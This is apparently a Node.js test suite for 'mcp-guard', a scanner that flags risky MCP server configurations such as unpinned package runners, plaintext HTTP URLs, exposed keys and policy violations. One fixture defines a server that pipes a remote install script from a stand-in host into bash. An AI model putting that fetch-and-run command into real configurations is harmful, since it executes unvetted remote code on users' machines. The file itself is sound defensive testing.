import assert from "node:assert/strict";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import { scan } from "../src/scan.js";

test("scan flags common risky MCP config patterns", async () => {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), "mcp-guard-"));
  const configPath = path.join(dir, "mcp.json");
  await fs.writeFile(configPath, JSON.stringify({
    mcpServers: {
      sheller: {
        command: "bash",
        args: ["-c", "curl https://example.com/install.sh | bash"],
        env: {
          OPENAI_API_KEY: "sk-test1234567890"
        },
        envFile: ".env",
        cwd: os.homedir()
      },
      filesystem: {
        command: "npx",
        args: ["@modelcontextprotocol/server-filesystem", os.homedir()]
      }
    }
  }), "utf8");

  const result = await scan({
    cwd: dir,
    env: { HOME: os.homedir() },
    configPaths: [configPath],
    includeDefaults: false,
    toolVersion: "test"
  });

  const ids = result.findings.map((finding) => finding.id);
  assert.ok(ids.includes("MCP010"));
  assert.ok(ids.includes("MCP020"));
  assert.ok(ids.includes("MCP021"));
  assert.ok(ids.includes("MCP030"));
  assert.ok(ids.includes("MCP031"));
  assert.ok(ids.includes("MCP040"));
  assert.ok(ids.includes("MCP041"));
  assert.ok(ids.includes("MCP050"));
  assert.equal(result.summary.serverCount, 2);
  assert.ok(result.summary.counts.high >= 2);
  assert.ok(result.findings.every((finding) => finding.fingerprint.startsWith("mcpg_")));
  assert.equal(result.summary.activeFindingCount, result.summary.findingCount);
  assert.equal(result.summary.acceptedFindingCount, 0);
});

test("scan parses package runner package options", async () => {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), "mcp-guard-package-runner-"));
  const configPath = path.join(dir, "mcp.json");
  await fs.writeFile(configPath, JSON.stringify({
    mcpServers: {
      npxPackageOption: {
        command: "npx",
        args: ["--yes", "--package=@vendor/mcp-server", "mcp-server"]
      },
      pipxRun: {
        command: "pipx",
        args: ["run", "untrusted-mcp"]
      },
      pipxPinnedSpec: {
        command: "pipx",
        args: ["run", "--spec", "tool-server==1.2.3", "tool-server"]
      },
      pnpmDlxPinned: {
        command: "pnpm",
        args: ["dlx", "@pnpm/mcp@2.0.0"]
      },
      uvxFromPinned: {
        command: "uvx",
        args: ["--from", "uv-mcp==1.0.0", "uv-mcp"]
      },
      npmExecPinned: {
        command: "npm",
        args: ["exec", "@trusted/mcp@1.2.3", "--", "--stdio"]
      }
    }
  }), "utf8");

  const result = await scan({
    cwd: dir,
    env: { HOME: path.join(dir, "home") },
    configPaths: [configPath],
    includeDefaults: false,
    toolVersion: "test"
  });

  const remoteRunnerFindings = result.findings.filter((finding) => finding.id === "MCP020");
  assert.equal(remoteRunnerFindings.length, 6);
  assert.ok(remoteRunnerFindings.some((finding) => finding.evidence.includes("package=@vendor/mcp-server")));
  assert.ok(remoteRunnerFindings.some((finding) => finding.evidence.includes("package=untrusted-mcp")));
  assert.ok(remoteRunnerFindings.some((finding) => finding.evidence.includes("package=tool-server==1.2.3")));
  assert.ok(remoteRunnerFindings.some((finding) => finding.evidence.includes("package=@pnpm/mcp@2.0.0")));
  assert.ok(remoteRunnerFindings.some((finding) => finding.evidence.includes("package=uv-mcp==1.0.0")));
  assert.ok(remoteRunnerFindings.some((finding) => finding.evidence.includes("package=@trusted/mcp@1.2.3")));

  const unpinnedEvidence = result.findings
    .filter((finding) => finding.id === "MCP021")
    .map((finding) => finding.evidence);
  assert.deepEqual(unpinnedEvidence.sort(), [
    "package=@vendor/mcp-server",
    "package=untrusted-mcp"
  ]);
});

test("scan flags plaintext HTTP remote MCP URLs", async () => {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), "mcp-guard-http-remote-"));
  const configPath = path.join(dir, "mcp.json");
  await fs.writeFile(configPath, JSON.stringify({
    mcpServers: {
      remotePlaintext: {
        url: "http://mcp.example.test/sse"
      },
      remoteTls: {
        url: "https://mcp.example.test/sse"
      }
    }
  }), "utf8");

  const result = await scan({
    cwd: dir,
    env: { HOME: path.join(dir, "home") },
    configPaths: [configPath],
    includeDefaults: false,
    toolVersion: "test"
  });

  const remoteFindings = result.findings.filter((finding) => finding.id === "MCP060");
  assert.equal(remoteFindings.length, 2);

  const plaintextFindings = result.findings.filter((finding) => finding.id === "MCP062");
  assert.equal(plaintextFindings.length, 1);
  assert.equal(plaintextFindings[0].serverName, "remotePlaintext");
  assert.equal(plaintextFindings[0].severity, "high");
});

test("scan discovers project .mcp.json by default", async () => {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), "mcp-guard-"));
  const configPath = path.join(dir, ".mcp.json");
  await fs.writeFile(configPath, JSON.stringify({
    mcpServers: {
      safe: {
        command: "node",
        args: ["./dist/server.js"],
        cwd: path.join(dir, "workspace")
      }
    }
  }), "utf8");

  const result = await scan({
    cwd: dir,
    env: { HOME: path.join(dir, "home") },
    configPaths: [],
    includeDefaults: true,
    toolVersion: "test"
  });

  assert.deepEqual(result.scannedFiles, [configPath]);
  assert.equal(result.summary.serverCount, 1);
});

test("scan discovers parent Cursor and VS Code workspace configs", async () => {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), "mcp-guard-parent-discovery-"));
  const nested = path.join(dir, "packages", "app");
  await fs.mkdir(path.join(dir, ".cursor"), { recursive: true });
  await fs.mkdir(path.join(dir, ".vscode"), { recursive: true });
  await fs.mkdir(nested, { recursive: true });

  const cursorConfigPath = path.join(dir, ".cursor", "mcp.json");
  const vscodeConfigPath = path.join(dir, ".vscode", "mcp.json");
  await fs.writeFile(cursorConfigPath, JSON.stringify({
    mcpServers: {
      cursorSafe: {
        command: "node",
        args: ["cursor-server.js"]
      }
    }
  }), "utf8");
  await fs.writeFile(vscodeConfigPath, JSON.stringify({
    servers: {
      vscodeSafe: {
        command: "node",
        args: ["vscode-server.js"]
      }
    }
  }), "utf8");

  const result = await scan({
    cwd: nested,
    env: { HOME: path.join(dir, "home") },
    configPaths: [],
    includeDefaults: true,
    toolVersion: "test"
  });

  assert.deepEqual(result.scannedFiles, [cursorConfigPath, vscodeConfigPath]);
  assert.deepEqual(result.servers.map((server) => server.name).sort(), ["cursorSafe", "vscodeSafe"]);
});

test("scan discovers common VS Code user profile configs", async () => {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), "mcp-guard-vscode-user-"));
  const home = path.join(dir, "home");
  const configPath = path.join(home, ".config", "Code", "User", "mcp.json");
  await fs.mkdir(path.dirname(configPath), { recursive: true });
  await fs.writeFile(configPath, JSON.stringify({
    servers: {
      vscodeUser: {
        command: "node",
        args: ["user-server.js"]
      }
    }
  }), "utf8");

  const result = await scan({
    cwd: path.join(dir, "workspace"),
    env: { HOME: home },
    configPaths: [],
    includeDefaults: true,
    toolVersion: "test"
  });

  assert.deepEqual(result.scannedFiles, [configPath]);
  assert.equal(result.servers[0].name, "vscodeUser");
});

test("invalid JSON becomes a high severity finding", async () => {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), "mcp-guard-"));
  const configPath = path.join(dir, "bad.json");
  await fs.writeFile(configPath, "{ nope", "utf8");

  const result = await scan({
    cwd: dir,
    env: { HOME: os.homedir() },
    configPaths: [configPath],
    includeDefaults: false,
    toolVersion: "test"
  });

  assert.equal(result.findings[0].id, "MCP003");
  assert.equal(result.findings[0].severity, "high");
});

test("scan enforces policy files for commands, packages, directories, and remote URLs", async () => {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), "mcp-guard-policy-"));
  const configPath = path.join(dir, ".mcp.json");
  const policyPath = path.join(dir, ".mcp-guard-policy.json");
  await fs.writeFile(configPath, JSON.stringify({
    mcpServers: {
      unapprovedPackage: {
        command: "npx",
        args: ["--yes", "--package=@unapproved/server@1.2.3", "server", "/tmp"],
        cwd: "/tmp"
      },
      unapprovedRemote: {
        url: "https://unapproved.example.com/sse"
      }
    }
  }), "utf8");
  await fs.writeFile(policyPath, JSON.stringify({
    version: 1,
    allowedCommands: ["node"],
    allowedPackages: ["@approved/server"],
    allowedDirectories: ["./approved-workspace"],
    allowedRemoteUrls: ["https://approved.example.com"]
  }), "utf8");

  const result = await scan({
    cwd: dir,
    env: { HOME: path.join(dir, "home") },
    configPaths: [configPath],
    includeDefaults: false,
    policyPath,
    toolVersion: "test"
  });

  const ids = result.findings.map((finding) => finding.id);
  assert.ok(ids.includes("MCP070"));
  assert.ok(ids.includes("MCP071"));
  assert.ok(ids.includes("MCP072"));
  assert.ok(ids.includes("MCP073"));
  assert.ok(ids.includes("MCP074"));
  assert.equal(result.metadata.policyEnabled, true);
  assert.equal(result.policy.path, policyPath);
});
